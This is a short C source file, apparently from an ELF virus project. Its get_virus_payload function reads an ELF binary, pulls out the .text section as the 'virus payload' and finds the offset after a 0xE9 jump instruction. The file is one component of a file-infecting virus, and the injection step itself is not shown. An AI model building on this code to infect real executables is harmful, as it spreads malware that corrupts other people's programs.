//
// Created by arattel on 13.12.19.
//

#include "payload.h"
#include <stdio.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <zconf.h>
#include <string.h>
#include <errno.h>



void get_virus_payload(char* filename, uint8_t** memory, size_t* virus_size, Elf64_Addr* jump_off_t){
    int fd = open(filename, O_RDONLY);
    struct stat sb;

    fstat(fd, &sb);


    uint8_t *mem = mmap(NULL, sb.st_size, PROT_READ,  MAP_PRIVATE, fd, 0);

    Elf64_Ehdr* ehdr = (Elf64_Ehdr *) mem;
    Elf64_Phdr* phdr = (Elf64_Phdr *) &mem[ehdr->e_phoff];
    Elf64_Shdr* shdr = (Elf64_Shdr *) &mem[ehdr->e_shoff];


    Elf64_Addr start_of_text, end_of_text;

    Elf64_Shdr text_section;
    for(int  i = 0; i < ehdr->e_shnum; i++){
        char * section_name = (char*)(mem + (&shdr[ehdr->e_shstrndx])->sh_offset + shdr[i].sh_name);
        printf("%s\n", section_name);
        if(!strcmp(".text", section_name)){
            text_section = shdr[i];
        }
    }

    *memory  = mem + text_section.sh_offset;
    *virus_size = text_section.sh_size;
    for(size_t i = 0; i < *virus_size; i++){
        unsigned char* p = (unsigned char *) mem + i + text_section.sh_offset;
        if(*p == (unsigned char)'\xe9'){
            *jump_off_t = i + 5;
            break;
        }
    }
}